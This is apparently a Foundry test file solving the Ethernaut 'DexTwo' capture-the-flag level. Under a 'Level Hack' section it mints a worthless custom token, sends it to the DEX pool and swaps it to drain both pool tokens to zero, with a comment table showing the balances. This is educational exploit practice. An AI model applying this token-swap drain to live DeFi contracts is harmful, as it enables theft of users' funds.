// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/Ethernaut.sol";
import "../src/metrics/Statistics.sol";
import "../src/levels/DexTwoFactory.sol";
import "../src/levels/DexTwo.sol";

import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract M is ERC20 {
    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
    {}

    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }
}

contract DexTwoTest is Test {
    using stdStorage for StdStorage;

    Ethernaut ethernaut;
    Statistics statistics;
    address eoa = address(0x1337);

    function setUp() public {
        ethernaut = new Ethernaut();

        // Statistics is actually deployed as upgradeable proxy
        // Deploying and initializing it normally for simplicity
        statistics = new Statistics();
        statistics.initialize(address(ethernaut));

        // Set Statistics contract on Ethernaut
        ethernaut.setStatistics(address(statistics));
    }

    function testDexTwoHack() public {
        /* Level Setup */
        // Deploy level factory: DexTwoFactory
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        // Register level on Ethernaut
        ethernaut.registerLevel(dexTwoFactory);

        // Set caller to custom address
        vm.startPrank(eoa);
        vm.deal(eoa, 1 ether);

        // Start recording logs to capture new level instance address
        vm.recordLogs();
        // Create new level instance via Ethernaut
        ethernaut.createLevelInstance{value: 0.001 ether}(dexTwoFactory);

        // Parse emitted logs
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(
            entries[11].topics[0],
            keccak256("LevelInstanceCreatedLog(address,address,address)")
            // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelDexTwoCreatedLog = entries[11];

        // Cast bytes32 log arg into address
        address instanceAddress = address(
            uint160(uint256(levelDexTwoCreatedLog.topics[2]))
        );
        emit log_named_address("instanceAddress", instanceAddress);

        // Instantiate level instance
        DexTwo instance = DexTwo(payable(instanceAddress));

        /* Level Hack */
        // Very similar to Dex challenge
        // Restrictions on using different tokens is removed
        // We can mint our own token and transfer them to the pool to increase its balance
        // Thus when we get more tokens than whats available in the pool, we can drain the opposite token, just as we did in last challenge
        // Let M be the malicious token
        // | User Balance - A | User Balance - B | User Balance - M | Pool Balance - A | Pool Balance - B | Pool Balance - M | Swap | swapAmount |
        // | ---------------- | ---------------- | ---------------- | ---------------- | ---------------- | ---------------- | ---- | ---------- |
        // | 10               | 10               | 200              | 100              | 100              | 10               | 10 M | 100 A      |
        // | 110              | 10               | 190              | 0                | 100              | 20               | 20 M | 100 B      |
        // | 110              | 110              | 170              | 0                | 0                | 40               | 20 M | 100 B      |

        IERC20(instance.token1()).approve(address(instance), type(uint256).max);
        IERC20(instance.token2()).approve(address(instance), type(uint256).max);

        M m = new M("M", "M");
        m.mint(address(eoa), 210);
        m.transfer(address(instance), 10);
        m.approve(address(instance), type(uint256).max);

        instance.swap(
            address(m),
            instance.token1(),
            m.balanceOf(address(instance))
        );
        instance.swap(
            address(m),
            instance.token2(),
            m.balanceOf(address(instance))
        );

        uint256 poolBalanceToken1 = IERC20(instance.token1()).balanceOf(
            address(instance)
        );
        emit log_named_uint("poolBalanceToken1", poolBalanceToken1);
        assertTrue(poolBalanceToken1 == 0);
        uint256 poolBalanceToken2 = IERC20(instance.token2()).balanceOf(
            address(instance)
        );
        emit log_named_uint("poolBalanceToken2", poolBalanceToken2);
        assertTrue(poolBalanceToken2 == 0);

        /* Level Submit */
        // Start recording logs to capture level completed log
        vm.recordLogs();
        ethernaut.submitLevelInstance(payable(instanceAddress));

        // Parse emitted logs
        Vm.Log[] memory submitLogsEntries = vm.getRecordedLogs();
        assertEq(
            submitLogsEntries[1].topics[0],
            keccak256("LevelCompletedLog(address,address,address)")
            // event LevelCompletedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelCompletedLog = submitLogsEntries[1];

        // Cast bytes32 log arg into address
        address playerAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[1]))
        );
        emit log_named_address("playerAddress_", playerAddress_);

        address instanceAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[2]))
        );
        emit log_named_address("instanceAddress_", instanceAddress_);

        assertEq(playerAddress_, eoa);
        assertEq(instanceAddress_, instanceAddress);

        vm.stopPrank();
    }
}
